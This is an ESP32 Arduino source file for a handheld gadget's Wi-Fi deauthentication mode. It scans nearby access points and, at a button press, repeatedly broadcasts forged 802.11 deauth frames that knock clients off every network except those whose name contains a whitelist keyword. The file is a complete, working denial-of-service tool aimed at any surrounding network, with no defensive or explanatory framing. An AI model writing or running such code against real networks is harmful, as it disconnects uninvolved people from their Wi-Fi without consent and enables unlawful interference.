#include <Arduino.h>
#include <U8g2lib.h>
#include <WiFi.h>
#include "wifideauth.h"
#include "esp_wifi.h"

// Shared display
extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// Button pins
#define BUTTON_TOGGLE_PIN 26  // UP toggles deauth
#define BUTTON_SELECT_PIN 32  // SELECT to exit

// Deauth state
static bool deauthActive = false;
static unsigned long lastToggle = 0;
static const unsigned long toggleDebounce = 200;

// Exit handling
static bool entryPhase = true;        // true until first SELECT release
static unsigned long selectStart = 0;
static const unsigned long exitHold = 500; // ms to hold SELECT to exit

// AP info
struct AP_Info {
  uint8_t bssid[6];
  int     channel;
  String  ssid;
};
#define MAX_APS 20
static AP_Info ap_list[MAX_APS];
static int ap_count = 0;
static String whitelist_keyword = "SafeNetwork";

// Deauth frame
static uint8_t deauth_frame[26] = {
  0xC0,0x00,0x3A,0x01,
  // addresses
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00
};

// Helpers
static bool isWhitelisted(const String &ssid) {
  return ssid.indexOf(whitelist_keyword) >= 0;
}
static void sendFrame(const uint8_t bssid[6], int ch) {
  static const uint8_t client[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  memcpy(deauth_frame+4, client, 6);
  memcpy(deauth_frame+10, bssid, 6);
  memcpy(deauth_frame+16, bssid, 6);
  for(int i=0;i<10;i++){
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
  }
}
static void scanAPs() {
  int n = WiFi.scanNetworks(false,true);
  ap_count = n>MAX_APS?MAX_APS:n;
  for(int i=0;i<ap_count;i++){
    memcpy(ap_list[i].bssid, WiFi.BSSID(i),6);
    ap_list[i].channel = WiFi.channel(i);
    ap_list[i].ssid = WiFi.SSID(i);
  }
  WiFi.scanDelete();
}
static void deauthAll() {
  for(int i=0;i<ap_count;i++){
    if(!isWhitelisted(ap_list[i].ssid)){
      sendFrame(ap_list[i].bssid, ap_list[i].channel);
    }
  }
}

// Public API
void wifiDeauthSetup(){
  WiFi.mode(WIFI_AP);
  delay(500);

  // show loading
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);
  const char *msg="Loading Deauth...";
  int w=u8g2.getUTF8Width(msg);
  u8g2.drawStr((128-w)/2,32,msg);
  u8g2.sendBuffer();

  scanAPs();
  deauthActive=false;
  entryPhase=true;
  selectStart=0;

  // show ready prompt
  u8g2.clearBuffer();
  u8g2.drawStr(20,20,"WiFi Deauth Ready");
  u8g2.drawStr(15,40,"UP:toggle  SEL:exit");
  u8g2.sendBuffer();
}

bool wifiDeauthLoop(){
  unsigned long now=millis();
  // toggle deauth on UP
  if(digitalRead(BUTTON_TOGGLE_PIN)==LOW && now-lastToggle>toggleDebounce){
    deauthActive=!deauthActive;
    lastToggle=now;
  }

  // display and action
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);
  if(deauthActive){
    deauthAll();
    u8g2.drawStr(20,32,"Deauth ACTIVE");
  } else {
    u8g2.drawStr(50,32,"Paused");
  }
  u8g2.sendBuffer();

  // exit handling inside module
  bool sel=(digitalRead(BUTTON_SELECT_PIN)==LOW);
  if(entryPhase){
    if(!sel){
      entryPhase=false; // initial SELECT release swallowed
    }
  } else {
    if(sel){
      if(selectStart==0) selectStart=now;
      else if(now-selectStart>exitHold){
        selectStart=0;
        return true; 
      }
    } else {
      selectStart=0;
    }
  }

  delay(10);
  return false;
}
